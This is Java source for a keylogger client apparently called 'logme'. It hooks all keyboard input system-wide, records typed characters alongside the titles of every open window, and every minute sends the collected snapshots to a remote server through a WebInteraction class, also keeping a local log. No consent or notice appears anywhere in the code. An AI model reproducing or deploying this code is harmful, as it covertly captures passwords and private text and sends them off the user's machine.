package org.logme.client;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Collections;

import javax.swing.Timer;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseInputListener;

import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinDef.HWND;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinUser.WNDENUMPROC;
import com.sun.jna.win32.StdCallLibrary;

public class LogRunner implements NativeKeyListener, NativeMouseInputListener {

	protected String currChars;
	protected ArrayList<Snapshot> snapshots;
	protected Timer timer;
	protected Timer writeFile;
	protected LogFileIO logfileio;

	protected static final int TIME = 5000;
	protected static final int WRITE_TIME = 60000;

	public static void main(String[] args) {
		new LogRunner();
	}
	
	public String getHostname(){
		try {
			InetAddress addr;
			addr = InetAddress.getLocalHost();
			return addr.getHostName();
		} catch (UnknownHostException ex) {
			System.out.println("Hostname can not be resolved");
		}
		return "ANON";
	}

	public interface User32 extends StdCallLibrary {
		User32 INSTANCE = (User32) Native.loadLibrary("user32", User32.class);

		boolean EnumWindows(WinUser.WNDENUMPROC lpEnumFunc, Pointer arg);

		int GetWindowTextA(HWND hWnd, byte[] lpString, int nMaxCount);
	}

	protected LogRunner() {
		try {
			snapshots = new ArrayList<Snapshot>();
			currChars = "";
			timer = new Timer(TIME, new ActionListener() {

				@Override
				public void actionPerformed(ActionEvent arg0) {
					addChars();
				}
			});

			writeFile = new Timer(WRITE_TIME, new ActionListener() {

				@Override
				public void actionPerformed(ActionEvent arg0) {
					write();
				}

					
			});
			GlobalScreen.registerNativeHook();
			GlobalScreen.getInstance().addNativeKeyListener(this);
			
			timer.start();
			writeFile.start();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
	}
	
	protected void write(){
		SnapshotCollection sc = new SnapshotCollection(currChars, snapshots);
		WebInteraction wi = new WebInteraction();
		wi.sendObject(sc);
		LogFileIO logs = new LogFileIO();
		logs.writeFile(sc);
	}

	public ArrayList<String> windowText() {
		final ArrayList<String> titles = new ArrayList<String>();
		final User32 user32 = User32.INSTANCE;
		user32.EnumWindows(new WNDENUMPROC() {
			@Override
			public boolean callback(HWND hWnd, Pointer arg1) {
				byte[] windowText = new byte[512];
				user32.GetWindowTextA(hWnd, windowText, 512);
				String wText = Native.toString(windowText);

				// get rid of this if block if you want all windows regardless
				// of whether
				// or not they have text
				if (wText.isEmpty()) {
					return true;
				}
				titles.add(wText);
				return true;
			}
		}, null);
		return titles;
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {

	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {

	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		currChars += arg0.getKeyChar();
		timer.restart();
	}

	@Override
	public void nativeMouseClicked(NativeMouseEvent arg0) {
		addChars();
	}

	@Override
	public void nativeMousePressed(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub

	}

	@Override
	public void nativeMouseReleased(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub

	}

	@Override
	public void nativeMouseDragged(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub

	}

	@Override
	public void nativeMouseMoved(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub

	}

	protected void addChars() {
		ArrayList<String> winTitles = windowText();
		Collections.sort(winTitles);

		/*
		 * for(String s : winTitles){ if(s.contains("Google") ||
		 * s.contains("\\") || s.contains("/") || s.contains("Internet"))
		 * System.out.println(s); }
		 * System.out.println("-------------------------------------------");
		 */

		Snapshot s = new Snapshot(currChars, winTitles);
		System.out.println(s);
		snapshots.add(s);
		currChars = "";

	}

}
